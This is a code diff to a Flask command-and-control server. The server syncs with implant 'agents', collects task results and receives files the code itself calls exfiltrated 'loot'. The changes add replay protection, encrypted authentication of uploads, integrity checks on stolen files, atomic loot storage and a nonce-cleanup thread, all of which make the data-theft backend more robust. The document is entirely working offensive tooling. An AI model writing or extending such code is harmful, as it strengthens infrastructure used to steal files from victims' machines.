@@ -1,13 +1,18 @@
 from flask import Flask, request, jsonify, render_template, send_file, Response
 from werkzeug.utils import secure_filename
-from database import get_db_connection
+from database import get_db_connection, purge_old_nonces
 from crypto import generate_key, encrypt_payload, decrypt_payload
 from datetime import datetime, timezone
+import base64
+import hashlib
 import hmac
 import json
+import sqlite3
 import subprocess
 import shutil
 import tempfile
+import threading
+import time
 import os
 
 app = Flask(__name__)
@@ -132,6 +137,11 @@ def SyncDeviceState():
     if not key_hex:
         return jsonify({"error": "Unknown key_id"}), 403
 
+    try:
+        nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
+    except Exception:
+        return jsonify({"error": "Invalid payload"}), 400
+
     # Decrypt the inner payload
     try:
         raw  = decrypt_payload(key_hex, envelope["data"])
@@ -148,6 +158,15 @@ def SyncDeviceState():
     ip         = request.remote_addr
 
     conn = get_db_connection()
+
+    try:
+        conn.execute(
+            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
+            (kid, nonce_hex),
+        )
+    except sqlite3.IntegrityError:
+        conn.close()
+        return jsonify({"error": "Replay detected"}), 409
 
     existing = conn.execute("SELECT id FROM agents WHERE id = ?", (agent_id,)).fetchone()
 
@@ -262,6 +281,11 @@ def submit_result():
         return jsonify({"error": "Unknown key_id"}), 403
 
     try:
+        nonce_hex = base64.b64decode(envelope["data"])[:12].hex()
+    except Exception:
+        return jsonify({"error": "Invalid payload"}), 400
+
+    try:
         raw  = decrypt_payload(key_hex, envelope["data"])
         data = json.loads(raw)
     except Exception:
@@ -272,6 +296,16 @@ def submit_result():
 
     # Store result and handle self-destruct cleanup
     conn = get_db_connection()
+
+    try:
+        conn.execute(
+            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
+            (kid, nonce_hex),
+        )
+    except sqlite3.IntegrityError:
+        conn.close()
+        return jsonify({"error": "Replay detected"}), 409
+
     conn.execute(
         "INSERT INTO results (task_id, output) VALUES (?, ?)",
         (data["task_id"], data.get("output", "")),
@@ -1257,28 +1291,70 @@ def receive_upload():
     """Receive an exfiltrated file from an agent."""
     if "file" not in request.files:
         return jsonify({"error": "No file provided"}), 400
+    if "auth" not in request.form:
+        return jsonify({"error": "Missing auth"}), 400
 
     file = request.files["file"]
-    agent_id = request.form.get("agent_id", "unknown")
-    original_path = request.form.get("original_path", "")
 
+    try:
+        envelope = json.loads(request.form["auth"])
+        kid = envelope["kid"]
+        data = envelope["data"]
+    except (ValueError, KeyError, TypeError):
+        return jsonify({"error": "Invalid auth"}), 400
+
+    key_hex = _get_key_for_kid(kid)
+    if key_hex is None:
+        return jsonify({"error": "Unknown key"}), 403
+
+    try:
+        nonce_hex = base64.b64decode(data)[:12].hex()
+    except Exception:
+        return jsonify({"error": "Invalid payload"}), 400
+
+    try:
+        plaintext = decrypt_payload(key_hex, data)
+        meta = json.loads(plaintext)
+    except Exception:
+        return jsonify({"error": "Decryption failed"}), 403
+
+    file_data = file.read()
+    if hashlib.sha256(file_data).hexdigest() != meta.get("sha256"):
+        return jsonify({"error": "Integrity check failed"}), 400
+
+    # nonce INSERT shares conn with loot INSERT so both commit atomically
+    conn = get_db_connection()
+    try:
+        conn.execute(
+            "INSERT INTO seen_nonces (kid, nonce) VALUES (?, ?)",
+            (kid, nonce_hex),
+        )
+    except sqlite3.IntegrityError:
+        conn.close()
+        return jsonify({"error": "Replay detected"}), 409
+
+    agent_id = meta.get("agent_id", "unknown")
+    original_path = request.form.get("original_path", "")
     filename = secure_filename(file.filename) if file.filename else "unnamed"
     timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
     save_name = f"{timestamp}_{filename}"
     save_path = os.path.join(LOOT_DIR, save_name)
 
-    file.save(save_path)
-    file_size = os.path.getsize(save_path)
-
-    conn = get_db_connection()
-    conn.execute(
-        "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
-        (agent_id, filename, original_path, save_path, file_size),
-    )
-    conn.commit()
-    conn.close()
-
-    return jsonify({"status": "ok", "filename": filename, "size": file_size})
+    try:
+        with open(save_path, "wb") as f:
+            f.write(file_data)
+        conn.execute(
+            "INSERT INTO loot (agent_id, filename, original_path, file_path, file_size) VALUES (?, ?, ?, ?, ?)",
+            (agent_id, filename, original_path, save_path, len(file_data)),
+        )
+        conn.commit()
+        return jsonify({"status": "ok", "filename": filename, "size": len(file_data)})
+    except Exception:
+        if os.path.exists(save_path):
+            os.remove(save_path)
+        raise
+    finally:
+        conn.close()
 
 
 @app.route("/api/loot", methods=["GET"])
@@ -1450,6 +1526,19 @@ def _register_agent_routes():
 
 
 _register_agent_routes()
+
+
+# -- nonce cleanup --
+
+def _nonce_cleanup_loop():
+    while True:
+        time.sleep(3600)
+        try:
+            purge_old_nonces(days=7)
+        except Exception:
+            pass
+
+threading.Thread(target=_nonce_cleanup_loop, daemon=True, name="nonce-cleanup").start()
 
 
 # -- entry point --
